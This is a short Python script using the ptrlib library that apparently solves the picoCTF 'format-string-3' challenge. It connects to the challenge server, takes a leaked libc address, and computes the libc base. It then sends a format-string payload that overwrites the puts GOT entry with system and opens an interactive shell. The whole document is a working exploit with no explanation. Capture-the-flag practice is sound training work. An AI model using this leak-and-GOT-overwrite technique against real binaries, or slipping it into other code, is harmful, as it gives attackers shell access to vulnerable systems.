from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./format-string-3")
# sock = Process("./format-string-3")
sock = Socket("nc rhea.picoctf.net 61616")

sock.recvuntil("libc: ")
leak = int(sock.recvline(), 16)
libc.base = leak - libc.symbol("setvbuf")

payload = fsb(38, {elf.got("puts"): libc.symbol("system")}, bits=64)
sock.sendline(payload)

sock.sh()